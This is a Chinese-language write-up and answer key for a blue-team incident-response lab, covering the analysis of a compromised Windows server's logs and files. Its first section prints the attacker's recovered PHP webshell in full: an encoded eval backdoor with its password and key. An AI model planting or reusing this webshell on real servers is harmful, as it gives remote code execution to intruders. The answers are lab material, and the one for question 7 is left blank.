---

title: ATT&CK实战系列——蓝队防御（二）
date: 2026-03-18
categories:
  - 应急响应
tags:
  - 渗透靶场

---


# 搭建环境：
项目地址：[http://vulnstack.qiyuanxuetang.net/vuln/detail/16/](http://vulnstack.qiyuanxuetang.net/vuln/detail/16/)



前景需要：小李在某单位驻场值守，深夜12点，甲方已经回家了，小李刚偷偷摸鱼后，发现安全设备有告警，于是立刻停掉了机器开始排查。

这是他的服务器系统，请你找出以下内容，并作为通关条件：

1.攻击者的IP地址（两个）？

2.攻击者的webshell文件名？

3.攻击者的webshell密码？

4.攻击者的伪QQ号？

5.攻击者的伪服务器IP地址？

6.攻击者的服务器端口？

7.攻击者是如何入侵的（选择题）？

8.攻击者的隐藏用户名？



## 相关账户密码
用户:administrator

密码:Zgsf@qq.com







# 1.攻击者的IP地址（两个）？
分析日志

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457278.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457725.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457178.png)

使用 `STOR` 命令上传了一个名为 `**system.php**` 的文件  

> <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458668.png)
>





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458914.png)

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
  for($i=0;$i<strlen($D);$i++) {
    $c = $K[$i+1&15];
    $D[$i] = $D[$i]^$c;
  }
  return $D;
}
$pass='hack6618';
$payloadName='payload';
$key='7813d1590d28a7dd';
if (isset($_POST[$pass])){
  $data=encode(base64_decode($_POST[$pass]),$key);
  if (isset($_SESSION[$payloadName])){
    $payload=encode($_SESSION[$payloadName],$key);
    if (strpos($payload,"getBasicsInfo")===false){
      $payload=encode($payload,$key);
    }
    eval($payload);
    echo substr(md5($pass.$key),0,16);
    echo base64_encode(encode(@run($data),$key));
    echo substr(md5($pass.$key),16);
  }else{
    if (strpos($data,"getBasicsInfo")!==false){
      $_SESSION[$payloadName]=encode($data,$key);
    }
  }
}

```







### 使用 Log Parser 查看远程登录成功的 IP
这个命令会直接从系统的安全日志（Security Event Log）中提取登录成功的记录，并显示登录时间、用户名和来源 IP

`LogParser.exe -i:EVT -o:DATAGRID "SELECT TimeGenerated, EXTRACT_TOKEN(Strings, 5, '|') AS Username, EXTRACT_TOKEN(Strings, 18, '|') AS SourceIP FROM Security WHERE EventID=4624 AND EXTRACT_TOKEN(Strings, 8, '|')='10'"`



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457501.png)











# 2.攻击者的webshell文件名？
`system.php`

# 3.攻击者的webshell密码？
`hack6618`

# 4.攻击者的伪QQ号？




<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457186.png)

# 5.攻击者的伪服务器IP地址？
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457776.png)

# 6.攻击者的服务器端口？
# 7.攻击者是如何入侵的（选择题）？
从文件夹中找到的 frp，可以确定是 frp 攻击





# 8.攻击者的隐藏用户名？


<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458555.png)





# 答案：
1.攻击者的IP地址（两个）？`192.168.126.135`  `192.168.126.129`

2.攻击者的webshell文件名？`system.php`

3.攻击者的webshell密码？`hack6618`

4.攻击者的伪QQ号？`777888999321`

5.攻击者的伪服务器IP地址？`256.256.66.88`

6.攻击者的服务器端口？ `65536`

7.攻击者是如何入侵的（选择题）？

8.攻击者的隐藏用户名？`hack887$`



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458689.png)

